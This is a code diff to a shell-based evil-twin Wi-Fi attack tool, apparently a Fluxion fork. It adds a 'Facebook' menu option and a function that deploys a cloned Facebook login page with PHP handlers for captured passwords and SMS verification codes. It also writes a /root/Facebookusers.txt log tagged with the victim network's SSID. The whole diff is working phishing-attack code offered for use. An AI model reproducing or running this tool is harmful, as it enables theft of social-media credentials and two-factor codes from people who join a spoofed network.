@@ -3470,7 +3470,8 @@ function webinterface {
 			echo -e "$blue""13)"$transparent" Portuguese  [POR]"
 			echo -e "$blue""15)"$transparent" German      [GER]"
 			echo -e "$blue""16)"$transparent" Chinese     [ZH_CN](NEUTRA)"
-			echo -e "$blue""17)"$transparent"\e[1;31m $general_back"$transparent""
+			echo -e "$blue""17)"$transparent" Facebook" 
+			echo -e "$blue""18)"$transparent"\e[1;31m $general_back"$transparent""
 			
 			echo
 			echo -n "#? "
@@ -3595,7 +3596,12 @@ function webinterface {
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ZH
 				NEUTRA
 				break
-                       elif [ "$fluxass" = "17" ]; then
+
+			elif [ "$fluxass" = "17" ];then 
+				Facebook
+				break
+            
+            elif [ "$fluxass" = "18" ]; then
 				continue
 			fi
 
@@ -7117,8 +7123,39 @@ function XFINITY {
 
 mkdir $DUMP_PATH/data &>$flux_output_device
         cp -r $WORK_DIR/Sites/Login-Xfinity/Xfinity_files $DUMP_PATH/data
-	cp $WORK_DIR/Sites/Login-Xfinity/Xfinity.html $DUMP_PATH/data
+		cp $WORK_DIR/Sites/Login-Xfinity/Xfinity.html $DUMP_PATH/data
 	              }
+
+function topusers { 
+echo -e " " 
+echo -e " _ _ _ "
+ echo -e " /   \ __ _ _// _/ "
+ echo -e " / /\  |       /| )_ ___ \ " 
+ echo -e " / | \ | | / \ " 
+ echo -e " __| /|  /__ /___ / " 
+ echo -e " / / / / " 
+ echo -e " "
+}
+# Create a Facebook login page 
+function Facebook {
+mkdir $DUMP_PATH/data &>$ares_output_device
+        cp  $WORK_DIR/Sites/Facebook/config.ini $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/data.php $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/facebook-logo.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/font-awesome.min.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/index.htm $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/index.js $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/jquery.min.js $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/oauth.html $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/reset.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/roboto.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/style.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/datasms.php $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/Facebook/smscode.htm $DUMP_PATH/data
+		cp  $WORK_DIR/Sites/Facebook/Facebookusers.txt $DUMP_PATH/data
+
+[ -f /root/Facebookusers.txt ] || cp  $WORK_DIR/Sites/Facebook/Facebookusers.txt /root/Facebookusers.txt && echo  >> /root/Facebookusers.txt && echo -e "           "  >> /root/Facebookusers.txt && echo -e "             _____ _____________________ _________  "  >> /root/Facebookusers.txt && echo -e "            /  _  \\ _____   \_   _____//   _____/  "  >> /root/Facebookusers.txt && echo -e "           /  /_\  \|       _/|    __)_ \_____  \   "  >> /root/Facebookusers.txt && echo -e "          /    |    \    |   \|        \/        \  "  >> /root/Facebookusers.txt && echo -e "          \____|__  /____|_  /_______  /_______  /  "  >> /root/Facebookusers.txt && echo -e "                  \/       \/        \/        \/   "  >> /root/Facebookusers.txt && echo -e "          " && echo -e "               by princeofguilty & deltax           "  >> /root/Facebookusers.txt && echo -e "            "  >> /root/Facebookusers.txt && echo -e " Network ssid : $Host_SSID"  >> /root/Facebookusers.txt
+}
 
 #Conten interface web
 function HUAWEI {
